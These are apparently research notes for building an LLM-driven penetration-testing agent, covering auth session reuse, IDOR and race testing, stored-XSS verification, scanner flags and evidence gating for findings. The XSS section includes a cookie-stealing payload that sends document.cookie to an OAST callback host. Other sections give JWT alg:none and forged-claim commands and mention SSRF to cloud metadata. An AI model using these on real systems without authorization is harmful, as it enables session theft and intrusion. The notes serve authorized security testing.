# Auth and business-logic automation for an LLM pentest agent (Kali container)

> **Working notes, not documentation.** This file belongs to the research
> trail behind Mythos. It records what was true when it was written and is not
> kept in sync with the code. For maintained documentation see `README.md`,
> `AGENTS.md` and `docs/architecture.md`.

Note on method: ~28 fetches/searches. Findings below are only what fetched pages stated. Items I know from general tool knowledge but could not verify in this session are listed under Gaps or flagged "unverified" in Inferences. Repos seen: usestrix/strix, KeygraphHQ/shannon, aliasrobotics/cai.

## 1. Auth flows: login, session capture, reuse across CLI tools, two accounts

### Takeaway
Best container-friendly pattern: log in once (Playwright headless or direct API call), dump cookies/bearer to a state file, then derive per-tool header files from it. Nuclei has native secret files (static and dynamic login templates); katana, kr and jwt_tool accept -H/-rc/-rh; Playwright storageState supports multiple roles and API-based login. Nuclei cannot do browser OAuth/PKCE flows, so tokens must be obtained externally.

### Cited Findings
- Playwright: `context.storage_state(path=...)` saves cookies/localStorage/IndexedDB; `browser.new_context(storage_state=...)` loads it; two roles in one run = two contexts (admin.json, user.json); login can be done via `request.post(login_url, form=...)` then `request.storage_state(path=...)`, faster than UI flow. — [Playwright auth](https://playwright.dev/docs/auth)
- Playwright has no API to persist sessionStorage; workaround is `page.evaluate(() => JSON.stringify(sessionStorage))` and `context.add_init_script` to restore before page load. Delete state when it expires. — [Playwright auth](https://playwright.dev/docs/auth)
- Nuclei `-H "Header: value"` adds a header/cookie to every request (also reads from file). — [nuclei](https://github.com/projectdiscovery/nuclei)
- Nuclei secret file (`-sf secrets.yaml`, optional `-ps` prefetch): `static:` entries of type basicauth/query/bearertoken/header/cookie scoped by `domains` or `domains-regex`; `dynamic:` entries run a login template whose extractors export values (e.g. `{{wp-admin-cookie}}`) into a cookie/header secret. A target gets only one secret; `skip-secret-file: true` per template (v3.3.1+); secrets don't apply to headless templates (use `-var username=... -var password=...`); OAuth with PKCE cannot be completed by nuclei, supply token as bearertoken static secret. SOPS-encrypted secret files supported. — [ProjectDiscovery auth scans](https://docs.projectdiscovery.io/opensource/nuclei/authenticated-scans)
- Katana: `-H 'Authorization: Bearer <T>' -H 'Cookie: session=<S>'` (or `-H file.txt` with one header per line); `-jc -jsl` JS endpoint parsing; `-fx` extracts forms; `-headless -xhr` records XHR calls and sets cookies in browser; `-aff` experimental auto form fill (values in ~/.config/katana/form-config.yaml); `-cs` scope regex; `-kf robotstxt,sitemapxml` needs depth>=3; `-jsonl -o`. — [katana](https://github.com/projectdiscovery/katana)
- jwt_tool: `-t URL -rc "jwt=<JWT>" -M pb` (playbook), `-M er` (forced errors) with `-cv "Welcome"` canary value, `-X a` (alg:none), `-X i -I -pc name -pv admin` (inject JWKS + claim change), `-I -hc kid -hv payloads.txt` (kid fuzz), `-T` tamper, `-V -pk public.pem` verify, `-r request_file`. — [jwt_tool](https://github.com/ticarpi/jwt_tool)
- Auth Analyzer (Burp ext) models one session per role; parameters (CSRF/tokens) refreshed by Auto Extract (Set-Cookie, HTML input, JSON key), From-To string, static value, or prompt (for 2FA codes); replays traffic of the privileged user under each session; labels SAME / SIMILAR (same code, body length within +-5%) / DIFFERENT. — [Auth Analyzer](https://github.com/PortSwigger/auth-analyzer)
- Shannon supports authenticated testing configured with "credentials, login flows, TOTP, email authentication" (details in its docs/configuration.md, not fetched). — [Shannon](https://github.com/KeygraphHQ/shannon)
- Strix: grey-box via credentials passed with `--instruction`; page gives no login-automation detail. — [Strix](https://github.com/usestrix/strix)
- Kiterunner: `-H` custom header (default `x-forwarded-for: 127.0.0.1`), `kr scan host -w routes-small.kite -A=apiroutes-210328:20000 -x 10 -j 100 --ignore-length=N`, `kr kb replay` to rebuild a hit. — [kiterunner](https://github.com/assetnote/kiterunner)
- Arjun: GET/POST/POST-JSON/POST-XML parameter discovery, custom headers, passive extraction from JS/3 external sources, JSON/Burp output (exact flags not on README). — [Arjun](https://github.com/s0md3v/Arjun)

### Inferences
- Helper script 1 `auth_login.py` (Playwright): args = url, user, pass, optional totp-secret; tries (a) JSON login API detected via katana/HAR, (b) form login via heuristics (input[type=password], submit); writes `sessions/<role>.json` (storageState) plus derived `<role>.headers` (Cookie + Authorization from localStorage/response token) and `<role>.nuclei-secrets.yaml`. Same file feeds `katana -H @file`, `ffuf -H`, `sqlmap --cookie/-H`, `dalfox -H/--cookie`, `nuclei -sf`. (Flag names for ffuf/sqlmap/dalfox are standard but not re-verified here.)
- Helper script 2 `session_check.py`: replay a known authed baseline GET (e.g. /api/me); if status 401/403/redirect-to-login or body hash differs from baseline, re-run auth_login.py. Cheap, run before each tool batch.
- Two-account provisioning: signup twice with generated emails (`a+rand@lab`, `b+rand@lab`), store as roles `userA`, `userB` (+ `admin` if creds given); skill must record each account's own object IDs by crawling list endpoints while logged in.
- TOTP in labs: `pyotp.TOTP(secret).now()` inside auth_login.py (pyotp not verified here; Auth Analyzer's "prompt for input" is the human equivalent).
- Dalfox is described as v3 (Rust rewrite; Go v2 on separate branch) with `scan` subcommand, so command lines in older playbooks (`dalfox url ... -b`) may differ per installed version; pin and check `dalfox --help` in the container.

### Gaps
- Exact ffuf/sqlmap/dalfox auth flag syntax not verified from sources in this session.
- Shannon's TOTP/login-flow implementation (docs/configuration.md) not read.
- Caido and Burp AI session-handling features not fetched; no Caido source retrieved.
- Autorize, BOLA-finder, Autorepeater, restler not fetched.

## 2. Business logic: BOLA/IDOR, mass assignment, privesc, races, workflow, price manipulation

### Takeaway
Strix's playbooks encode the working method: Subject x Object x Action matrix, owner vs non-owner differential, transport variation, and invariant-violation proof with baseline vs abused flow under same principal. Races: single-packet attack (HTTP/2) is the state of the art; nuclei supports `race: true` with `race_count` for simple cases, h2spacex for Python-scripted single-packet.

### Cited Findings
- Strix IDOR skill: use >=2 principals (owner, non-owner, admin if exists); collect valid IDs from list/search/export endpoints; Subject x Object x Action matrix swapping IDs/tokens/tenants; repeat across REST/GraphQL/WebSocket/gRPC. Validation: show access to non-owned object, show same request denied when properly enforced, reproduce via >=2 transports, provide owner and non-owner request/response pairs. False positives: public-by-design data, idempotent metadata, empty results for another user's resource (silent enforcement; compare to owner's view). — [Strix idor.md](https://raw.githubusercontent.com/usestrix/strix/main/strix/skills/vulnerabilities/idor.md)
- Strix business_logic skill: (1) enumerate state machine per workflow, (2) Actor x Action x Resource matrix, (3) skip/repeat/reorder/late-mutate steps, (4) vary time, concurrency, channel, content type, (5) verify persistence in queues/jobs. Validation: invariant violation (two refunds for one charge, negative inventory, quota exceeded), side-by-side intended vs abused flow with same principal, durable state visible in authoritative source (ledger, emails, admin view), quantified impact. FPs: policy-allowed promos, visual-only inconsistencies, admin-only audited ops. Rule: server must recompute totals, flag client-side math acceptance. — [Strix business_logic.md](https://raw.githubusercontent.com/usestrix/strix/main/strix/skills/vulnerabilities/business_logic.md)
- Single-packet attack (Kettle, Black Hat USA 2023): HTTP/2, many full requests in one TCP packet (disable TCP_NODELAY, withhold final frame), makes ~20-30 requests arrive together regardless of jitter; reported 4-10x more effective; real replication succeeded in ~30 s vs >2 h for last-byte sync; in Turbo Intruder and Burp Repeater "Send group in parallel". Size limit ~1,500 bytes per packet; GMO Flatt extended via IP fragmentation and TCP sequence reorder. — [PortSwigger](https://portswigger.net/research/smashing-the-state-machine), [Flatt](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync)
- Nuclei race template: `race: true` + `race_count: N` in an http block with a raw request; `threads` with race sends different requests concurrently. Example: POST /vouchers/redeem code=GIFT50, race_count 5, status matcher 200. — [Nuclei race docs](https://docs.projectdiscovery.io/templates/protocols/http/race-conditions)
- h2spacex: Scapy-based HTTP/2 library implementing Single Packet Attack and Kettle's BH 2024 timing improvement; `pip install h2spacex`; `H2OnTlsConnection(hostname, port_number).setup_connection()`; examples in repo wiki/examples. — [h2spacex](https://github.com/nxenon/h2spacex)
- Schemathesis: `schemathesis run <schema-url>` for OpenAPI/GraphQL/gRPC; `schemathesis.toml` for headers (`Authorization = "Bearer ${API_TOKEN}"`), `generation.max-examples`, `rate-limit`; stateful testing via inferred operation links; sends real mutating requests (use staging). — [schemathesis](https://github.com/schemathesis/schemathesis)
- Auth Analyzer SAME/SIMILAR/DIFFERENT triage (status + body length) is a signal only and needs semantic confirmation. — [Auth Analyzer](https://github.com/PortSwigger/auth-analyzer)
- CAI case studies include race-condition exploit on a PortSwigger Academy upload flaw and API enumeration at Mercado Libre. — [CAI](https://github.com/aliasrobotics/cai)

### Inferences
- Helper script 3 `bola_diff.py`: input = OpenAPI/katana endpoint list + `userA`/`userB` header files + IDs harvested for A. For each GET/read endpoint with an ID in path/query/body: send as A (baseline 200 + body hash), as B, and unauthenticated; classify: B body equals A body and contains A-only markers (email/username) = candidate; B 403/404/empty = enforced. Read-only by default; write verbs only on resources created by the agent itself (so side effects stay on test data).
- Mass assignment: diff the OpenAPI request schema vs response schema of the same resource (fields present in response but not writable in request: role, isAdmin, balance, price, userId, tenantId); PATCH/PUT/POST with the extra field on own object, then GET to confirm persistence (durability rule from Strix). Use arjun to find undocumented params for endpoints without a spec.
- Race helper 4 `race.py`: wraps h2spacex or an httpx HTTP/2 raw send of N copies of an authed request on a single connection; reports count of 2xx vs expected-1 and the authoritative state afterwards (balance/inventory GET). Fallback = nuclei `race: true` template generated from a raw request. Confirm with minimal side effects: single-use resource the agent created (own coupon/gift code), N<=20, repeat 2 times, show baseline sequential run (only 1 success) vs parallel (>1).
- Price/quantity: send negative, zero, fractional, huge quantity and client-supplied price on a cart the agent owns; success criterion is the server-computed total/ledger changed, not a 200.

### Gaps
- No source found for Turbo Intruder script syntax, race-the-web, Autorize, BOLA-finder, restler in this session.
- Nuclei race semantic (does it use single-packet over HTTP/2?) not documented on fetched page; treat as unverified, prefer h2spacex/Turbo-style for HTTP/2 targets.

## 3. Stored XSS and OAST proofs

### Takeaway
Use interactsh (self-hosted for lab/isolated networks, public oast.* for internet targets) for blind callbacks; XBOW verifies XSS by having a headless browser actually execute the payload. Dalfox supports blind callbacks and headless verification.

### Cited Findings
- Interactsh server: `-d/-domain`, `-i/-ip`, `-t` token or `-a` random token, `-sa` skip ACME, `-cert/-privkey` wildcard cert, `-e` eviction days (default 30), `-ds` disk storage, `-ftp -smb -responder -wc` extras; needs glue records ns1/ns2 pointing at the server and open inbound ports (53, 80, 443, 25, 389...). Client: `-s` server (default public oast.*), `-t` token, `-n` payload count, `-ps/-psf` store payloads, `-pi` poll interval (default 5), `-sf` session file, `-json`, `-m/-f` match/filter, `-dns-only/-http-only`, `-o`. — [interactsh](https://github.com/projectdiscovery/interactsh)
- XBOW validates XSS via a headless browser that checks the JavaScript payload actually executed; validators are "automated peer reviewers", sometimes LLM-based, sometimes programmatic checks. — [XBOW blog](https://xbow.com/blog/top-1-how-xbow-did-it/)
- Dalfox v3 (Rust): `scan`, `server`, `payload`, `mcp` subcommands; reflected/stored/DOM detection, parameter mining, WAF fingerprinting; headers, cookies, methods, proxies; JSON/JSONL/SARIF output; flags listed include `-b` (blind callback), `--cookie`, `-H`, `--custom-payload`, `--remote-payloads`, `-p`, `--data`, `--har-file-path`; accepts URLs, files, stdin, raw HTTP, HAR. — [dalfox](https://github.com/hahwul/dalfox)
- Playwright (headless Chromium) cookie/state reuse enables logged-in browser sink checks. — [Playwright auth](https://playwright.dev/docs/auth)

### Inferences
- Admin-bot pattern for stored XSS: inject payload `<img src=x onerror="fetch('https://<id>.oast/x?c='+document.cookie)">` (unique token per injection point) as user A, then (a) visit the render page in Playwright with a second context and listen for dialog/console/`window.__xss` canary, and (b) poll `interactsh-client -json` for the token. Record both injection point and token map so late callbacks can be attributed.
- Helper script 5 `xss_verify.py`: given URL + authed storageState + marker payload, opens page headless, returns whether canary fired (`page.on("dialog")` / `console`), with screenshot evidence. This replaces trust in dalfox "V" findings with browser proof.
- Public oast domains are fine for internet targets; for isolated labs without egress, self-host and add the container's DNS (or `/etc/hosts` + `-sa`) as required. Unverified: whether the lab permits outbound DNS.

### Gaps
- xsstrike not researched; admin-bot specifics from XBOW/CTF not found in fetched sources.
- Dalfox v3 exact `-b`/headless flag semantics not documented on README.

## 4. Deeper server classes

### Takeaway
Concrete scanners exist for cache (WCVS), smuggling (smuggler.py), JWT (jwt_tool), GraphQL schema recovery (clairvoyance), but scanners give candidates only; each class needs a confirmation step (differential pair, OOB hit).

### Cited Findings
- WCVS (Hackmanit): Go CLI, `apt install web-cache-vulnerability-scanner` on Kali, or `go install -v github.com/Hackmanit/Web-Cache-Vulnerability-Scanner@latest`; `wcvs -u https://target`; needs header/param wordlists `-hw`/`-pw`; flags `-sc` cookies, `-sh` headers, `-ch` cache header, `-rr` rate, `-gr` JSON report, `-t` threads (default 20). Detects 10 poisoning techniques (unkeyed header/param, parameter cloaking, Fat GET, response splitting, smuggling, HHO, HMC, HMO, param pollution) and cache deception (path parameter, traversal via .css/static/robots.txt, appended special chars). — [WCVS](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner)
- smuggler.py (defparam): `python3 smuggler.py -u URL`, stdin host list, `-x` exit early, `-m` method (default POST), `-t` timeout 5, `-c` config (default.py/doubles.py/exhaustive.py), `-q`, `-l`; reports potential CL.TE and TE.CL, saves payloads to `payloads/`; README warns of false positives/negatives and large providers (Google, AWS, Akamai) producing FPs. — [smuggler](https://github.com/defparam/smuggler)
- jwt_tool modes/command lines: see section 1. — [jwt_tool](https://github.com/ticarpi/jwt_tool)
- Schemathesis supports GraphQL and gRPC (reflection) schemas. — [schemathesis](https://github.com/schemathesis/schemathesis)
- Strix IDOR rule: reproduce across REST and GraphQL transports. — [Strix idor.md](https://raw.githubusercontent.com/usestrix/strix/main/strix/skills/vulnerabilities/idor.md)
- Strix skills tree has dirs analysis, cloud, coordination, custom, frameworks, protocols, reconnaissance, scan_modes, technologies, tooling, vulnerabilities (names like `authentication_jwt`, `business_logic` used as skill examples). — [Strix skills](https://github.com/usestrix/strix/tree/main/strix/skills)

### Inferences
- Deserialization (ysoserial/phpggc), XXE OOB, SSRF to metadata (169.254.169.254), graphw00f, ppmap, upload scanner, WebSocket, OAuth misconfig: I did not retrieve sources. Skills should still use the common pattern: payload carries an interactsh URL (XXE/SSRF/deserialization DNS gadget such as URLDNS), and finding = OOB hit whose token maps to the injection point. Mark as unverified tool knowledge.
- Smuggling confirmation: smuggler flags are candidates; require a differential timing/response-desync pair against own connection only, never poison shared caches on a live target. WCVS cache poisoning: use a unique cache-buster param so only the agent's own key is poisoned.

### Gaps
- No fetched sources for: ysoserial, phpggc, graphw00f, clairvoyance (404 on the URL tried; the real repo is believed to be nikitastupin/clairvoyance, unverified), ppmap, http-garden, upload scanner, WebSocket tooling, OAuth misconfig checklists, SSRF-to-metadata specifics.

## 5. API discovery

### Takeaway
Seed from a spec when available (schemathesis), else brute API routes (kiterunner), crawl with katana JS parsing, and find hidden params with arjun.

### Cited Findings
- Kiterunner: `kr scan` with compiled `.kite` route wordlists and Assetnote lists; Swagger specs are a data source for wordlists, no separate OpenAPI replay command documented; `kr kb replay` for hit verification. — [kiterunner](https://github.com/assetnote/kiterunner)
- Katana `-jc`, `-jsl` (jsluice), `-fx` forms, `-headless -xhr` XHR capture, authenticated via `-H`. — [katana](https://github.com/projectdiscovery/katana)
- Schemathesis loads OpenAPI/GraphQL/gRPC and infers stateful links. — [schemathesis](https://github.com/schemathesis/schemathesis)
- Arjun passive mode extracts parameters from JS and external sources. — [Arjun](https://github.com/s0md3v/Arjun)

### Inferences
- Pipeline: probe common spec paths (/openapi.json, /swagger.json, /v3/api-docs, /graphql introspection) with httpx; if found, convert to endpoint list for bola_diff.py and schemathesis; else katana -jc -xhr authed, then kr scan, then arjun on interesting endpoints.

### Gaps
- LinkFinder, xnLinkFinder, restler not researched.

## 6. Anti-hallucination and evidence gating

### Takeaway
Leading agents gate findings on proof: XBOW uses validators (LLM or programmatic) with specific evidence requirements; Shannon reports only exploited findings ("No exploit, no report"); Strix skills demand baseline-vs-abused pairs and durable state. Business-logic remains the weak spot for automated validation.

### Cited Findings
- XBOW: validators act as automated peer reviewers confirming each finding, some LLM-based, some custom code. — [XBOW blog](https://xbow.com/blog/top-1-how-xbow-did-it/)
- Per XBOW CISO Nico Waisman (theCUBE), agents over-report because they try to please the user, so validators act as second check. — [theCUBE](https://www.thecube.net/events/rsa/rsac-2026-conference/content/Videos/4a4fa1ac-ab10-404b-9ffb-92fc86455ed1)
- Dolan-Gavitt: early false positives came from the model's strong desire to find flaws; validators got specific evidence requirements; some false positives remain, especially business logic. — [Dark Reading](https://www.darkreading.com/vulnerabilities-threats/ai-based-pen-tester-top-bug-hunter-hackerone)
- XBOW platform: finding surfaced only with reproducible exploit evidence. — [XBOW platform](https://xbow.com/platform)
- A third-party article cites a March 2026 XBOW study (1,060 attacks on HackerOne programs, zero false positives); not verified against the original. — [Codeant](https://codeant.ai/blogs/xbow-features)
- Shannon: "No exploit, no report"; validation stage discards what can't be demonstrated; reconciliation merges/deduplicates candidates into an exploitation queue; severity gates count only `status: exploited`; specialist agents for Injection, XSS, SSRF, Authentication, Authorization. — [Shannon](https://github.com/KeygraphHQ/shannon)
- Strix rules: baseline vs abused flow under same principal; durable state in authoritative source; at least two transports for IDOR; explicit false-positive lists per class. — [Strix business_logic.md](https://raw.githubusercontent.com/usestrix/strix/main/strix/skills/vulnerabilities/business_logic.md), [idor.md](https://raw.githubusercontent.com/usestrix/strix/main/strix/skills/vulnerabilities/idor.md)
- CAI: four-layer guardrail defense against prompt injection of the agent (arXiv:2508.21669); "Retester" agent said to inspire a HackerOne dedup agent (authors' claim); repo now unmaintained. — [CAI](https://github.com/aliasrobotics/cai)

### Inferences
- Closure-state schema for Mythos findings: `candidate -> reproduced -> validated(proof artefact) | rejected(reason)`; only `validated` is reported. Required artefacts per class: IDOR = A/B/anon request-response triple + owner marker in B's body; stored XSS = canary fired in browser or OAST token hit; race = sequential baseline (1 success) vs parallel (n>1) plus authoritative state; SSRF/XXE/deser = OOB token mapped to injection point; JWT = forged token accepted on protected endpoint with canary content, and rejected without forging.
- Prompt rules for open-weight models: (1) "A 200 status or a scanner line is not evidence"; (2) must paste exact request and the response excerpt proving it; (3) run negative control (same request without exploit, or as wrong user) and state difference; (4) if proof missing, label `unconfirmed`, never `confirmed`; (5) separate observation from hypothesis; (6) a second "validator" pass in a fresh context re-executes the stored PoC command and only checks output (mirrors XBOW's validators / Shannon's exploit stage).
- Treat tool SAME/SIMILAR/DIFFERENT-style heuristics as triage only (Auth Analyzer itself warns they use code and length, not semantics).

### Gaps
- XBOW/Strix actual prompt text for evidence rules not retrieved; only skill markdown for two classes read.
- No data on which rules measurably reduce over-claiming on open-weight models; the prompt rules above are my design inference, not sourced.
- Burp AI and Caido implementations not researched.
